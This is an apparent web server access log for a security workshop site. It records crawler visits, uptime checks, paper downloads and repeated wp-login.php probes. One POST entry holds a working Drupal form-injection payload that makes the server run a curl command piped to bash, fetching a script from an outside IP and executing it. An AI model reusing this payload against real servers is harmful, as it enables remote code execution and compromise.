145.94.181.47 - - [04/May/2018:03:53:29 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
145.94.181.47 - - [04/May/2018:03:53:29 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
145.94.181.47 - - [04/May/2018:03:53:30 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
145.94.181.47 - - [04/May/2018:03:53:31 -0400] "GET /2018/dates HTTP/1.1" 200 2875 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
34.227.81.106 - - [04/May/2018:03:53:47 -0400] "GET / HTTP/1.1" 200 6642 "-" "Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)"
66.249.64.219 - - [04/May/2018:03:54:16 -0400] "GET /2018 HTTP/1.1" 200 6903 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.217 - - [04/May/2018:03:56:18 -0400] "GET /favicon.ico HTTP/1.1" 404 4094 "-" "Googlebot-Image/1.0"
69.162.124.227 - - [04/May/2018:03:57:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
107.77.222.85 - - [04/May/2018:03:59:32 -0400] "GET /papers/1993/nspw1993-thuraisingham.pdf HTTP/1.1" 200 531335 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) CriOS/66.0.3359.122 Mobile/15E216 Safari/604.1"
66.249.64.17 - - [04/May/2018:04:00:40 -0400] "GET /2015/cfp HTTP/1.1" 200 9316 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [04/May/2018:04:01:07 -0400] "GET /2004/past.content HTTP/1.1" 200 5294 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:04:02:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.195 - - [04/May/2018:04:02:34 -0400] "GET /papers/1993/nspw1993-dobson.pdf HTTP/1.1" 200 1283662 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.236 - - [04/May/2018:04:03:22 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
94.68.157.50 - - [04/May/2018:04:03:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.68.157.50 - - [04/May/2018:04:03:41 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.190.218 - - [04/May/2018:04:04:11 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 5774 "https://www.nspw.org/2017" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
77.88.47.40 - - [04/May/2018:04:05:24 -0400] "GET /2011/submissions HTTP/1.1" 200 7030 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [04/May/2018:04:07:10 -0400] "GET /2004/papers.content HTTP/1.1" 200 6247 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:04:07:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
83.49.83.125 - - [04/May/2018:04:08:19 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
83.49.83.125 - - [04/May/2018:04:08:20 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
92.99.247.215 - - [04/May/2018:04:08:32 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 117995 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; ms-office)"
92.99.247.215 - - [04/May/2018:04:08:54 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 75701 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
92.99.247.215 - - [04/May/2018:04:08:41 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 206 83147 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; ms-office)"
157.55.39.142 - - [04/May/2018:04:08:51 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 200 294209 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
92.99.247.215 - - [04/May/2018:04:09:23 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 304 352 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
92.99.247.215 - - [04/May/2018:04:09:40 -0400] "GET /favicon.ico HTTP/1.1" 404 841 "https://www.nspw.org/papers/2010/nspw2010-lilien.pdf" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
92.99.247.215 - - [04/May/2018:04:08:55 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 569680 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
182.185.158.238 - - [04/May/2018:04:10:14 -0400] "GET / HTTP/1.1" 200 11776 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.17 - - [04/May/2018:04:10:49 -0400] "GET /papers/1993/nspw1993-lin-2.pdf HTTP/1.1" 200 981215 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
49.146.47.133 - - [04/May/2018:04:12:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.146.47.133 - - [04/May/2018:04:12:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:04:12:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.191.130.94 - - [04/May/2018:04:13:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.191.130.94 - - [04/May/2018:04:13:52 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.76.175.183 - - [04/May/2018:04:15:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.76.175.183 - - [04/May/2018:04:15:35 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
150.145.65.115 - - [04/May/2018:04:15:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
150.145.65.115 - - [04/May/2018:04:15:43 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.47.87.140 - - [04/May/2018:04:16:55 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.140 - - [04/May/2018:04:16:56 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.140 - - [04/May/2018:04:16:56 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740388 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
69.162.124.227 - - [04/May/2018:04:17:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
93.230.161.96 - - [04/May/2018:04:18:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.230.161.96 - - [04/May/2018:04:18:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.215 - - [04/May/2018:04:19:05 -0400] "GET /2005/cfp2005.pdf HTTP/1.1" 200 68233 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
117.214.100.75 - - [04/May/2018:04:20:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
117.214.100.75 - - [04/May/2018:04:20:20 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [04/May/2018:04:20:24 -0400] "GET /favicon.ico HTTP/1.1" 404 4123 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
220.181.108.145 - - [04/May/2018:04:20:40 -0400] "GET / HTTP/1.1" 200 11573 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
197.15.215.30 - - [04/May/2018:04:21:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.15.215.30 - - [04/May/2018:04:21:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:04:22:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
199.47.87.141 - - [04/May/2018:04:23:54 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.141 - - [04/May/2018:04:23:54 -0400] "GET /robots.txt HTTP/1.1" 200 4249 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
199.47.87.141 - - [04/May/2018:04:23:54 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740388 "-" "TurnitinBot (https://turnitin.com/robot/crawlerinfo.html)"
141.138.181.99 - - [04/May/2018:04:25:08 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
141.138.181.99 - - [04/May/2018:04:25:08 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [04/May/2018:04:26:48 -0400] "GET /2010/pc HTTP/1.1" 200 6658 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [04/May/2018:04:26:51 -0400] "GET /papers/2002/nspw2002-venkatakrishnan.pdf HTTP/1.1" 200 855187 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:04:27:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
201.127.42.147 - - [04/May/2018:04:28:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.127.42.147 - - [04/May/2018:04:28:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.142 - - [04/May/2018:04:29:08 -0400] "GET /papers/1993/nspw1993-thomas.pdf HTTP/1.1" 200 494825 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
103.31.100.117 - - [04/May/2018:04:31:09 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.31.100.117 - - [04/May/2018:04:31:11 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [04/May/2018:04:31:30 -0400] "GET /2009/proceedings/1996/nspw1996-wulf.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.59 - - [04/May/2018:04:31:57 -0400] "GET /2009/proceedings/2006/nspw2006-porras.pdf HTTP/1.1" 200 158055 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
105.246.3.29 - - [04/May/2018:04:32:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.246.3.29 - - [04/May/2018:04:32:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:04:32:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
169.1.14.88 - - [04/May/2018:04:37:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
169.1.14.88 - - [04/May/2018:04:37:35 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:04:37:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
36.255.54.241 - - [04/May/2018:04:38:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
36.255.54.241 - - [04/May/2018:04:38:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
65.55.210.29 - - [04/May/2018:04:39:35 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 5928 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.144 - - [04/May/2018:04:39:36 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 4387 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.5 - - [04/May/2018:04:39:37 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 3880 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.150 - - [04/May/2018:04:39:37 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 4206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.144 - - [04/May/2018:04:39:38 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.29 - - [04/May/2018:04:39:38 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.108 - - [04/May/2018:04:39:39 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 4192 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.25.5 - - [04/May/2018:04:39:39 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.110 - - [04/May/2018:04:39:40 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 6626 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
77.88.47.40 - - [04/May/2018:04:42:10 -0400] "GET /2000/local.html HTTP/1.1" 200 5695 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:04:42:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [04/May/2018:04:43:42 -0400] "GET /2010/papers HTTP/1.1" 200 7322 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.247 - - [04/May/2018:04:43:50 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.217 - - [04/May/2018:04:43:55 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
79.117.202.129 - - [04/May/2018:04:43:59 -0400] "POST //?q=user/password&name[%23post_render][]=system&name[%23markup]=curl%20-s%20http://222.11.22.126/api/logo7.jpg%20%7C%20bash%20-s&name[%23type]=markup HTTP/1.1" 200 6318 "-" "Ruby"
79.117.202.129 - - [04/May/2018:04:44:00 -0400] "POST /?q=file/ajax/name/%23value/form-s4ZjXf5OrZ9NKJSxe_Bv6mpjFvIYcDzhKMiYSUGbdI0 HTTP/1.1" 200 2115 "-" "Ruby"
180.76.15.143 - - [04/May/2018:04:44:09 -0400] "GET /papers/?C=D;O=A HTTP/1.1" 403 3907 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.122.44.55 - - [04/May/2018:04:45:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.122.44.55 - - [04/May/2018:04:45:21 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
116.206.14.41 - - [04/May/2018:04:46:21 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
116.206.14.41 - - [04/May/2018:04:46:21 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
199.16.157.181 - - [04/May/2018:04:46:53 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
173.205.33.27 - - [04/May/2018:04:47:05 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769460 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
69.162.124.227 - - [04/May/2018:04:47:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
223.229.159.100 - - [04/May/2018:04:48:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
223.229.159.100 - - [04/May/2018:04:48:04 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.141 - - [04/May/2018:04:48:54 -0400] "GET /papers/1994/nspw1994-dobson.pdf HTTP/1.1" 200 711042 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.236 - - [04/May/2018:04:50:54 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
14.232.235.91 - - [04/May/2018:04:50:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
14.232.235.91 - - [04/May/2018:04:50:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [04/May/2018:04:52:21 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 200 336632 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [04/May/2018:04:52:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [04/May/2018:04:45:51 -0400] "GET /2009/proceedings/2009/nspw2009-gibson.pdf HTTP/1.1" 200 2988152 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [04/May/2018:04:53:31 -0400] "GET /2001/cfp.html HTTP/1.1" 200 6365 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [04/May/2018:04:53:34 -0400] "GET /papers/2002/nspw2002-toyoizumi.pdf HTTP/1.1" 200 527520 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [04/May/2018:04:54:01 -0400] "GET /papers/2008/nspw2008-wurster.pdf HTTP/1.1" 200 369129 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
54.210.24.16 - - [04/May/2018:04:55:00 -0400] "GET /2018 HTTP/1.1" 200 6944 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
34.207.144.96 - - [04/May/2018:04:55:00 -0400] "GET /2018 HTTP/1.1" 200 12432 "http://www.netaro.info/~zetaka/projects/ConfShare/update_history.rss" "Mozilla/5.0 (compatible; FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
216.244.66.200 - - [04/May/2018:04:55:43 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
77.88.47.40 - - [04/May/2018:04:48:31 -0400] "GET /2009/proceedings/2009/nspw2009-gibson.pdf HTTP/1.1" 200 2774258 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.215 - - [04/May/2018:04:56:20 -0400] "GET /papers/2010/nspw2010-maxion.pdf HTTP/1.1" 200 409311 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [04/May/2018:04:57:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [04/May/2018:04:51:01 -0400] "GET /2009/proceedings/2009/nspw2009-gibson.pdf HTTP/1.1" 200 2878115 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
81.214.83.179 - - [04/May/2018:04:59:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.214.83.179 - - [04/May/2018:04:59:40 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.59 - - [04/May/2018:05:00:15 -0400] "GET /papers/1993/nspw1993-gomez.pdf HTTP/1.1" 200 800679 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [04/May/2018:05:02:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
116.74.186.167 - - [04/May/2018:05:03:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
116.74.186.167 - - [04/May/2018:05:03:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.101.123.80 - - [04/May/2018:05:05:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.101.123.80 - - [04/May/2018:05:05:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
